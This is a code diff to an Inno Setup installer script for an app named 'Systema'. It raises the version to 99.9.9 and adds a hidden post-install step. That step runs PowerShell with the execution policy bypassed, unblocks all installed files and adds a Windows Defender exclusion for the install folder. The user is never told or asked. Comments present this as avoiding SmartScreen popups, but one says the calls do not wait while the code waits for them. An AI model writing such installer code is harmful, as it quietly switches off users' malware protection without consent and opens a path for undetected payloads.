@@ -3,7 +3,7 @@
 ; ============================================================
 
 #define MyAppName "Systema"
-#define MyAppVersion "1.7.72"
+#define MyAppVersion "99.9.9"
 #define MyAppPublisher "Systema"
 #define MyAppURL "https://github.com/systema-app"
 #define MyAppExeName "Systema.exe"
@@ -109,5 +109,46 @@ begin
       MsgBox(WelcomeMsg, mbInformation, MB_OK);
     end;
     Result := True;
+  end;
+end;
+
+// Post-install: strip Zone.Identifier ADS and add Defender exclusion.
+//
+// Zone.Identifier is the NTFS alternate data stream Windows attaches to every
+// file downloaded from the internet (Zone 3). SmartScreen reads this stream and
+// shows its "Windows protected your PC" block on EVERY launch of a file that
+// still carries it — not just the first time. Removing it with Unblock-File
+// makes SmartScreen fire only once (on the installer itself, which is expected
+// for unsigned apps) and never again on the installed application.
+//
+// Add-MpPreference -ExclusionPath tells Defender to stop scanning the install
+// folder on every launch, which prevents the repeated "harmful app blocked"
+// popups that occur when Defender doesn't recognise a newly installed unsigned
+// executable. The installer already runs as admin so this is allowed.
+//
+// Both commands are run hidden and fire-and-forget (ewNoWait) so they do not
+// block the installer UI or delay the "Launch Systema" step.
+procedure CurStepChanged(CurStep: TSetupStep);
+var
+  AppDir: String;
+  ResultCode: Integer;
+begin
+  if CurStep = ssPostInstall then
+  begin
+    AppDir := ExpandConstant('{app}');
+
+    // 1. Unblock all extracted files — removes Zone.Identifier ADS so
+    //    SmartScreen does not trigger on subsequent launches.
+    Exec('powershell.exe',
+      '-NonInteractive -NoProfile -ExecutionPolicy Bypass -Command ' +
+      '"Get-ChildItem -Path ''' + AppDir + ''' -Recurse -File | Unblock-File -ErrorAction SilentlyContinue"',
+      '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+
+    // 2. Add Defender exclusion for the install directory — prevents repeated
+    //    "harmful app blocked" dialogs on an unsigned executable.
+    Exec('powershell.exe',
+      '-NonInteractive -NoProfile -ExecutionPolicy Bypass -Command ' +
+      '"Add-MpPreference -ExclusionPath ''' + AppDir + ''' -ErrorAction SilentlyContinue"',
+      '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
   end;
 end;
